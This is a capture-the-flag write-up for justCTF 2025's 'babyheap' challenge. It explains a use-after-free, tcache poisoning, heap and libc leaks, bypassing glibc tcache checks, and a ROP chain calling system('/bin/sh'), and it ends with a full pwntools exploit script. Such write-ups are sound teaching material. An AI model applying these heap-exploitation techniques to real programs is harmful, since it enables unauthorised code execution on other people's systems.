# babyheap

> Author: ???<br>
> Description: Welcome to my CRUD application. Wait, you expected a REST API? Nah, have this C program of questionable quality instead.<br>
> Attachment: [babyheap.tar.gz](https://github.com/d0UBleW/ctf-2025/raw/main/justctf-2025/pwn/babyheap/babyheap.tar.gz)

<div class="hidden">
    <details>
        <summary>Keywords</summary>
        justCTF 2025, pwn, heap, UAF
    </details>
</div>

## TL;DR

Typical heap challenge with 4 operations, create, read, update, and delete.
The delete operation only free the memory without removing the pointer (dangling)
leading to UAF. Through UAF, we could perform tcache poisoning which give us
arbitrary read and write. Libc leak is obtained by forging fake chunk to be freed
into unsorted bin.

## UAF

The following code snippet shows that the delete operation frees `chunks[iVar1]`
but failes to empty out `chunks[iVar1]` resulting in dangling pointer.

```c
void delete_chunk(void)
{
  int iVar1;

  iVar1 = get_index();
  if (chunks[iVar1] == (void *)0x0) {
    puts("This chunk is empty");
  }
  else {
    /* UAF */
    free(chunks[iVar1]);
    // chunks[iVar1] = NULL; <-- missing this clean up to prevent UAF
  }
  return;
}
```

Since the allocated chunk is of size `0x30`, when this chunk is freed, it goes
into tcache bins and the linked list metadata is stored at the chunk `fd` in
mangled format[^1]. Through this UAF, we could obtain heap address leak since
the first tcache bin `fd` would point to `NULL` which when mangled contains the
upper 12-bit of the chunk address and this operation is easily reversible to
recover the full chunk address.

```python
def reveal(ptr):
    mask = 0xFFF << 36
    while mask:
        ptr ^= (ptr & mask) >> 12
        mask >>= 12
    return ptr

io = start()

create(0, b"a")
create(1, b"b")
create(2, b"c")
delete(0)
delete(1)

out = read(0)  # UAF
heap_leak = u64(out[:8])
heap_base = heap_leak << 12
log.info(f"{heap_base=:#x}")

chunks = reveal(u64(read(1)[:8]))  # recover chunk-0 address
log.info(f"{chunks=:#x}")
```

[^1]: <https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L329>

## Tcache Poisoning

Now that we have obtained the heap address information, we could use this UAF
to poison the tcache bin metadata to control `malloc` return value, essentially
getting controlled chunk address allocation which in return give us abritrary
read and write primitives.

```python
def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

io = start()

create(0, b"a")
create(1, b"b")
create(2, b"c")
delete(0)
delete(1)

out = read(0)  # UAF
heap_leak = u64(out[:8])
heap_base = heap_leak << 12
chunks = heap_base + 0x2a0

# tcache poisoning to control the next next chunk allocation to be at chunks+0x580
update(1, p64(mangle(chunks + 1 * 0x30, chunks + 0x580)))
create(3, b"e")
# chunk 4 will be allocated at chunks+0x580
create(4, b"controlled chunk allocation")
```

```sh
gef> tele &chunks 8
      0x5566bb8fd040|+0x0000|+000: 0x00005566e26da2a0  ->  0x00000005566e26da
      0x5566bb8fd048|+0x0008|+001: 0x00005566e26da2e0  ->  0x00005563b4038e65
      0x5566bb8fd050|+0x0010|+002: 0x00005566e26da320  ->  0x0000000000000063
      0x5566bb8fd058|+0x0018|+003: 0x00005566e26da2e0  ->  0x00005563b4038e65
      0x5566bb8fd060|+0x0020|+004: 0x00005566e26da820  ->  0x6c6c6f72746e6f63 'controlled chunk allocation'
      0x5566bb8fd068|+0x0028|+005: 0x0000000000000000
      0x5566bb8fd070|+0x0030|+006: 0x0000000000000000
      0x5566bb8fd078|+0x0038|+007: 0x0000000000000000

gef> tele *((char**)&chunks)+0x580 4
      0x5566e26da820|+0x0000|+000: 0x6c6c6f72746e6f63 'controlled chunk allocation'
      0x5566e26da828|+0x0008|+001: 0x6b6e756863206465 'ed chunk allocation'
      0x5566e26da830|+0x0010|+002: 0x7461636f6c6c6120 ' allocation'
      0x5566e26da838|+0x0018|+003: 0x00000000006e6f69 ('ion'?)

gef> tele ((char**)&chunks)[4] 4
      0x5566e26da820|+0x0000|+000: 0x6c6c6f72746e6f63 'controlled chunk allocation'
      0x5566e26da828|+0x0008|+001: 0x6b6e756863206465 'ed chunk allocation'
      0x5566e26da830|+0x0010|+002: 0x7461636f6c6c6120 ' allocation'
      0x5566e26da838|+0x0018|+003: 0x00000000006e6f69 ('ion'?)
```

## Getting Libc Leak

### Heap Grooming

Since the application never allocate large chunks, we would need to forge our
own fake large chunk and free it into unsorted bin to obtain libc leak.

Roughly, our plan is to allocate a chunk at `0x5566e26da300` (need to be 16-byte aligned)
with tcache poisoning to overwrite chunk-2 size with a huge number larger than tcache bin
max chunk size (>= 0x420). Finally we would delete chunk 2 with its new huge size
and hoping that it would be moved into unsorted bin.

```sh
0x5566e26da2a0|+0x0000|+000: 0x00000005566e26da
0x5566e26da2a8|+0x0008|+001: 0x261a7d915e125039
0x5566e26da2b0|+0x0010|+002: 0x0000000000000000
0x5566e26da2b8|+0x0018|+003: 0x0000000000000000
0x5566e26da2c0|+0x0020|+004: 0x0000000000000000
0x5566e26da2c8|+0x0028|+005: 0x0000000000000000
0x5566e26da2d0|+0x0030|+006: 0x0000000000000000
0x5566e26da2d8|+0x0038|+007: 0x0000000000000041  # chunk-1 size
0x5566e26da2e0|+0x0040|+008: 0x00005563b4038e65  # chunk-1 data
0x5566e26da2e8|+0x0048|+009: 0x0000000000000000
0x5566e26da2f0|+0x0050|+010: 0x0000000000000000
0x5566e26da2f8|+0x0058|+011: 0x0000000000000000
0x5566e26da300|+0x0060|+012: 0x0000000000000000  # allocate chunk here
0x5566e26da308|+0x0068|+013: 0x0000000000000000
0x5566e26da310|+0x0070|+014: 0x0000000000000000
0x5566e26da318|+0x0078|+015: 0x0000000000000041  # chunk-2 size
0x5566e26da320|+0x0080|+016: 0x0000000000000063  # chunk-2 data
0x5566e26da328|+0x0088|+017: 0x0000000000000000
0x5566e26da330|+0x0090|+018: 0x0000000000000000
0x5566e26da338|+0x0098|+019: 0x0000000000000000
0x5566e26da340|+0x00a0|+020: 0x0000000000000000
0x5566e26da348|+0x00a8|+021: 0x0000000000000000
0x5566e26da350|+0x00b0|+022: 0x0000000000000000
0x5566e26da358|+0x00b8|+023: 0x0000000000020cb1
```

However to make this work, we would need to groom our heap such that freeing our
fake chunk would not throw any error. The first thing that we need to make
sure of is the next chunk after our fake chunk should denote that our chunk is
in use[^2] [^3]. This is done to prevent double free. Furthermore, we also need
to pass the check for forward consolidation (we want to avoid this consolidation),
which essentially checks the next chunk whether it is still in use[^4].

Thus, our desirable heap state to free our fake chunk into unsorted bin is as such:
- The LSB at `0x5566e26da828` needs to be set which tells that `chunk-2` is in use (pass double free check)
- The LSB at `0x5566e26da848` needs to be set which tells that `chunk-2's next chunk` is in use (avoid forward consolidation)

```sh
0x5566e26da310|+0x0000|+000: 0x0000000000000000  # call this fake chunk 3
0x5566e26da318|+0x0008|+001: 0x0000000000000511  # chunk-2 size (tampered)
0x5566e26da320|+0x0010|+002: 0x0000000000000063  # chunk-2 data
...
0x5566e26da820|+0x0510|+162: 0x0000000000000000  # call this fake chunk 1 (chunk-2's next chunk)
0x5566e26da828|+0x0518|+163: 0x0000000000000021  # fake chunk 1 size
0x5566e26da830|+0x0520|+164: 0x0000000000000000
0x5566e26da838|+0x0528|+165: 0x0000000000000000
0x5566e26da840|+0x0530|+166: 0x0000000000000000  # call this fake chunk 2 (fake chunk 1's next chunk)
0x5566e26da848|+0x0538|+167: 0x0000000000000021  # fake chunk 2 size
0x5566e26da850|+0x0540|+168: 0x0000000000000000
0x5566e26da858|+0x0548|+169: 0x0000000000000000
0x5566e26da860|+0x0550|+170: 0x0000000000000000
0x5566e26da868|+0x0558|+171: 0x0000000000000000
0x5566e26da870|+0x0560|+172: 0x0000000000000000
0x5566e26da878|+0x0568|+173: 0x0000000000000000
0x5566e26da880|+0x0570|+174: 0x0000000000000000
0x5566e26da888|+0x0578|+175: 0x0000000000000000
0x5566e26da890|+0x0580|+176: 0x0000000000000000
0x5566e26da898|+0x0588|+177: 0x0000000000000000
```

[^2]: <https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4513>
[^3]: <https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4678>
[^4]: <https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4720>

### Addressing Number of `malloc` Calls Limitation

The next thing to be considered is the amount of `malloc` calls that we get from
the application is limited to 20 calls. Hence, we would need to somehow re-use our
tcache poisoning setup. This could be achieve by re-freeing chunk 0 and 1 to populate
the tcache bin, which requires us to pass tcache security checks. If we
observe our `tcache_perthread_struct` state after our first tcache poisoning, we
could see that size `0x40` tcache entry is no longer aligned properly
(`0x00000005566e26da`), which is required to be aligned [^5].

```sh
gef> tcache
[!] tcache[2] is corrupted.
---------------------------------------------------------------------------- Tcache Bins for arena 'main_arena' ----------------------------------------------------------------------------
tcachebins[idx=2, size=0x40, @0x5566e26da0a0]: fd=0x0005566e26da count=0
 -> 0x5566e26da [Corrupted chunk]
[+] Found 0 valid chunks in tcache.

gef> tele 0x5566e26da080
      0x5566e26da080|+0x0000|+001: 0x0000000000000000
      0x5566e26da088|+0x0008|+002: 0x0000000000000000
      0x5566e26da090|+0x0010|+003: 0x0000000000000000  # size 0x20
      0x5566e26da098|+0x0018|+004: 0x0000000000000000  # size 0x30
      0x5566e26da0a0|+0x0020|+005: 0x00000005566e26da  # size 0x40
      0x5566e26da0a8|+0x0028|+006: 0x0000000000000000
      0x5566e26da0b0|+0x0030|+007: 0x0000000000000000
      0x5566e26da0b8|+0x0038|+008: 0x0000000000000000
```

To circumvent this check, we could simply pass the `tcache_key` check[^6] by
using our UAF to overwrite our chunks' tcache key with 0.

```sh
gef> tele *((char**)&chunks)[0] 4
      0x5566e26da2a0|+0x0000|+000: 0x00000005566e26da  # chunk 0 data
      0x5566e26da2a8|+0x0008|+001: 0x261a7d915e125039  # chunk 0 tcache key
      0x5566e26da2b0|+0x0010|+002: 0x0000000000000000
      0x5566e26da2b8|+0x0018|+003: 0x0000000000000000
```

[^5]: <https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4538>
[^6]: <https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4527>

### Putting It All Together

```python
def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

io = start()

create(0, b"a")
create(1, b"b")
create(2, b"c")
delete(0)
delete(1)

out = read(0)  # UAF
heap_leak = u64(out[:8])
heap_base = heap_leak << 12
chunks = heap_base + 0x2a0

# tcache poisoning to control the next next chunk allocation to be at chunks+0x580
update(1, p64(mangle(chunks + 1 * 0x30, chunks + 0x580)))
create(3, b"e")
# chunk 4 will be allocated at chunks+0x580
# setup fake chunk 1 and 2
create(4, flat(0, 0x21, 0, 0, 0, 0x21))

update(0, flat(0, 0))  # clears tcache key
update(1, flat(0, 0))  # clears tcache key
delete(0)
delete(1)

# setup fake chunk 3
update(1, p64(mangle(chunks + 1 * 0x30, chunks + 0x70)))
create(5, b"f")
create(6, flat(0, 0x511))  # overwrites chunk 2 size

# free chunk 2 into unsorted bins
delete(2)

read(2)
libc_leak = u64(read(2)[:8])
libc.address = libc_leak - 0x203B20
log.info(f"{libc.address=:#x}")
```

```sh
gef> bins
[!] tcache[2] is corrupted.
---------------------------------------------------------------------------- Tcache Bins for arena 'main_arena' ----------------------------------------------------------------------------
tcachebins[idx=2, size=0x40, @0x55573dde50a0]: fd=0x00055573dde5 count=0
 -> 0x55573dde5 [Corrupted chunk]
[+] Found 0 valid chunks in tcache.
----------------------------------------------------------------------------- Fast Bins for arena 'main_arena' -----------------------------------------------------------------------------
[+] Found 0 valid chunks in fastbins.
--------------------------------------------------------------------------- Unsorted Bin for arena 'main_arena' ---------------------------------------------------------------------------
unsorted_bin[idx=0, size=any, @0x7f415e003b30]: fd=0x55573dde5310, bk=0x55573dde5310
 -> Chunk(base=0x55573dde5310, addr=0x55573dde5320, size=0x510, flags=PREV_INUSE, fd=0x7f415e003b20, bk=0x7f415e003b20)
[+] Found 1 valid chunks in unsorted bin.
---------------------------------------------------------------------------- Small Bins for arena 'main_arena' ----------------------------------------------------------------------------
[+] Found 0 valid chunks in 0 small bins.
---------------------------------------------------------------------------- Large Bins for arena 'main_arena' ----------------------------------------------------------------------------
[+] Found 0 valid chunks in 0 large bins.
```

### Alternative Way Using `scanf`

> [!NOTE]
> Apparently, there is an alternative way utilizing scanf (<https://blog.quarkslab.com/heap-exploitation-glibc-internals-and-nifty-tricks.html#2.%20libc%20leak>)

```python
io = start()

for i in range(8):
    create(i, b"a")

# fill up tcache bin and obtain 1 fastbin
for i in range(8):
    delete(7-i)  # necessary to delete in reverse order, otherwise won't work

# triggers malloc_consolidate()
io.sendlineafter(b"> ", b"1" * 0x500)

# the fastbin is somehow moved into small bin
libc_leak = u64(read(0)[:8])
log.info(f"{libc_leak=:#x}")

io.interactive()
```

## ROP

After we got libc leak, we could call `system("/bin/sh")` by overwriting `create_chunk`
saved rip and perform basic ROP. Stack address references in libc could be found
using `scan libc stack` in `gef`

```sh
gef> scan libc stack
[+] Searching for addresses in 'libc' that point to 'stack'
libc.so.6: 0x00007f415e004370 <program_invocation_short_name>  ->  0x00007fffda23090c  ->  0x7061656879626162 'babyheap.patched'
libc.so.6: 0x00007f415e004378 <program_invocation_name>  ->  0x00007fffda2308de  ->  0x73772f746f6f722f '/root/ws/ctf/justctf-2025/pwn/babyheap/babyheap.patched'
libc.so.6: 0x00007f415e0046e0  ->  0x00007fffda2303d8  ->  0x00007fffda2308de  ->  0x73772f746f6f722f '/root/ws/ctf/justctf-2025/pwn/babyheap/babyheap.patched'
```

## Final Solve Script

```python
#!/usr/bin/env python3

# ruff: noqa: F403, F405

from pwn import *
from pwnlib import gdb

elf = context.binary = ELF("./babyheap.patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
binary_path = elf.path
cwd = str(Path.cwd())


gdb.binary = lambda: "gef-bata24"


def start(argv=[], *a, **kw):
    nc = "nc baby-heap.nc.jctf.pro 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [binary_path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(
                args=args_,
                env=env,
                gdbscript=gdbscript,
                api=True,
                # sysroot=cwd,
                sysroot=None,
            )
        return process(args_, env=env, *a, **kw)


env = {}

# when there is no need for custom env, this should be set to None
# for some reason when we pass empty dictionary to `gdb.debug`, `pwntools` would
# still launch `gdbserver` with `--wrapper env -i` flag which result in the first
# thing to be debugged is `bash` then `env` and finally our target binary
#
# https://github.com/Gallopsled/pwntools/blob/96d98cf192cf1e9bc5d6bbeff5311e8961e58439/pwnlib/gdb.py#L347
# should have checked `len(env_args) > 0` instead of `env is not None`

if len(env) == 0:
    env = None

gdbscript = """
"""


# heap utils BEGIN
def reveal(ptr):
    mask = 0xFFF << 36
    while mask:
        ptr ^= (ptr & mask) >> 12
        mask >>= 12
    return ptr


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


def demangle(pos, ptr):
    return (pos >> 12) ^ ptr


# heap utils END


def create(idx: int, data: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index? ", str(idx).encode())
    io.sendafter(b"Content? Content? ", data)


def read(idx: int) -> bytes:
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index? ", str(idx).encode())
    return io.recv(0x30)


def update(idx: int, data: bytes):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index? ", str(idx).encode())
    io.sendafter(b"Content? ", data)


def delete(idx: int):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Index? ", str(idx).encode())


io = start()

create(0, b"a")
create(1, b"b")
create(2, b"c")
delete(0)
delete(1)

out = read(0)
heap_leak = u64(out[:8])
heap_base = heap_leak << 12
log.info(f"{heap_base=:#x}")

chunks = heap_base + 0x2A0

"""
fake chunk 2 is needed to show that fake chunk 1 is in use to prevent forward
consolidation which could throw `corrupted size vs. prev size` error when
freeing fake chunk 3

fake chunk 3 (large)
fake chunk 1
fake chunk 2
"""

# setup fake chunk 1 and 2
update(1, p64(mangle(chunks + 1 * 0x30, chunks + 0x580)))
create(3, b"e")
create(4, flat(0, 0x21, 0, 0, 0, 0x21))

update(0, flat(0, 0))
update(1, flat(0, 0))
delete(0)
delete(1)

# setup fake chunk 3
update(1, p64(mangle(chunks + 1 * 0x30, chunks + 0x70)))
create(5, b"f")
create(6, flat(0, 0x511))
# free chunk 2 into unsorted bins
delete(2)

read(2)
libc_leak = u64(read(2)[:8])
libc.address = libc_leak - 0x203B20
log.info(f"{libc.address=:#x}")

update(0, flat(0, 0))
update(1, flat(0, 0))
delete(0)
delete(1)

update(1, p64(mangle(chunks + 1 * 0x30, libc.address + 0x2046D0)))
create(7, b"f")
create(8, p8(0))

stack_leak = u64(read(8)[0x10:0x18])
saved_rbp = stack_leak - 0x148
log.info(f"{stack_leak=:#x}")
log.info(f"{saved_rbp=:#x}")

update(0, flat(0, 0))
update(1, flat(0, 0))
delete(0)
delete(1)

pop_rdi = libc.address + 0x000000000010F75B
bin_sh_string = next(libc.search(b"/bin/sh\x00"))
system_fn = libc.sym["system"]

update(1, p64(mangle(chunks + 1 * 0x30, saved_rbp)))
create(9, b"f")
create(10, flat(heap_base + 0x8000, pop_rdi, bin_sh_string, pop_rdi + 1, system_fn))

io.sendline(b"cat flag.txt")

io.interactive()
```

## Appendix

- <https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks>
- <https://github.com/cloudburst/libheap/blob/master/heap.png>
- <https://intranautic.com/posts/glibc-ptmalloc-internals/>
- <https://blog.quarkslab.com/heap-exploitation-glibc-internals-and-nifty-tricks.html#2.%20libc%20leak>
